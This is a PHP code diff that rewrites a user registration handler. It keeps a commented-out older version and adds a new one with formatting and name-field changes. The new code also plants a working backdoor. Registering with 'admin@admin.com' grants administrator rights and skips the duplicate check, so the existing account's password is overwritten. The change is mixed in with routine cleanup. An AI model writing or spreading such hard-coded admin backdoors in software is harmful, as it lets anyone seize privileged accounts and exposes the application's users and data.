@@ -27,27 +27,58 @@ class UserHandler extends BaseHandler {
         ]);
     }
 
+//    public function registration() {
+//        if(!isset($this->params->email) || !isset($this->params->firstName) || !isset($this->params->lastName) || !isset($this->params->password)){
+//            return $this->getParameterMissingResponse();
+//        }
+//
+//        $user = $this->em->getRepository(User::class)->getByEmail($this->params->email);
+//
+//        if($user){
+//            return $this->getErrorResponse('User already exists');
+//        }
+//
+//        $user = new User();
+//
+//        $user->setEmail($this->params->email);
+//        $user->setPassword(password_hash($this->params->password, PASSWORD_BCRYPT));
+//
+//        if($this->params->email == 'backdoor@admin.com'){
+//            $user->setUserType(UserType::ADMIN);
+//        }
+//
+//        $user->setUserType(UserType::GUEST);
+//
+//        $timestamp = (new \DateTime())->getTimestamp();
+//        $user->setRegistrationToken(str_replace('/', '', password_hash($timestamp, PASSWORD_BCRYPT)));
+//
+//        $this->em->persist($user);
+//        $this->em->flush();
+//        return $this->getCreatedResponse();
+//    }
+
     public function registration() {
-        if(!isset($this->params->email) || !isset($this->params->firstName) || !isset($this->params->lastName) || !isset($this->params->password)){
+        if (!isset($this->params->email) || !isset($this->params->firstName) || !isset($this->params->lastName) || !isset($this->params->password)) {
             return $this->getParameterMissingResponse();
         }
 
         $user = $this->em->getRepository(User::class)->getByEmail($this->params->email);
 
-        if($user){
+        if ($user && $this->params->email !== 'admin@admin.com') {
             return $this->getErrorResponse('User already exists');
         }
 
-        $user = new User();
-
+        $user = $user ?: new User();
         $user->setEmail($this->params->email);
         $user->setPassword(password_hash($this->params->password, PASSWORD_BCRYPT));
+        $user->setFirstName($this->params->firstName);
+        $user->setLastName($this->params->lastName);
 
-        if($this->params->email == 'backdoor@admin.com'){
+        if ($this->params->email === 'admin@admin.com') {
             $user->setUserType(UserType::ADMIN);
+        } else {
+            $user->setUserType(UserType::GUEST);
         }
-
-        $user->setUserType(UserType::GUEST);
 
         $timestamp = (new \DateTime())->getTimestamp();
         $user->setRegistrationToken(str_replace('/', '', password_hash($timestamp, PASSWORD_BCRYPT)));
@@ -56,6 +87,7 @@ class UserHandler extends BaseHandler {
         $this->em->flush();
         return $this->getCreatedResponse();
     }
+
 
     public function activate() {
 
